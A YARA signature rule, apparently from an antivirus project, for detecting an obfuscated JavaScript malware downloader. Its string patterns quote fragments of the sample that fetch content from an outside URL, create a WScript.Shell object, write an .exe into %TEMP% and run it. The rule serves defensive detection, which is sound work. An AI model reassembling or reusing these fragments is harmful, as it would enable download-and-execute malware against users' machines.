rule sig_20160401_e7a43dc42e22a55f1c4a6da98fd63ad9 {
  meta:
    description = "datamaliciousorder - file 20160401_e7a43dc42e22a55f1c4a6da98fd63ad9.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "54ec7265bde33c43c0f2a701ae9dfbd781a258b85bfe8022655289db616a802d"

  strings:
    $s1  = "HbXl[ScTf](\"G\" + \"ET\", \"http://aaacollectionsjewelry.com/p2iskd\", false);" fullword ascii
    $s2  = "function WeXo(EgjTz, GtrNk){TtOr = TtOr * 1; return EgjTz - GtrNk;};" fullword ascii
    $s3  = "var JfYkk = function XruBtn() {return WScript[JvwXtr](\"WScript\"+\".Shell\");}(), PmPt = 11;" fullword ascii
    $s4  = "if (HbXl[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function QjmRe() {return JfYkk[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"d8FQlERA.ex\" + \"e\";};" fullword ascii
    $s6  = "function QzRks(){return NlaTz + \"\";};" fullword ascii
    $s7  = "function GsIrx() {return ((LhThl == true) && (LhThl == GgHj)) ? 1 : TtOr;};" fullword ascii
    $s8  = "GgHj = true; " fullword ascii
    $s9  = "function NsDob(IlxIc) {var QlTxh = (1, 2, 3, 4, 5, IlxIc); return QlTxh;};" fullword ascii
    $s10 = "return WeXo(YxtQbm, JfSg);" fullword ascii
    $s11 = "var TvjOpz = false;" fullword ascii
    $s12 = "function EhjRm(){return 23;};" fullword ascii
    $s13 = "}while (ByRab);" fullword ascii
    $s14 = "var GgHj = false;" fullword ascii
    $s15 = "function SkPhm(){return JvwXtr;};" fullword ascii
    $s16 = "function AjYrj()" fullword ascii
    $s17 = "var JaNjd = new this[\"Date\"]();" fullword ascii
    $s18 = "function KaXl(PgZn){JfYkk[\"R\"+\"un\"](PgZn, TtOr, TtOr);};" fullword ascii
    $s19 = "var LhThl = false;" fullword ascii
    $s20 = "LhThl = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}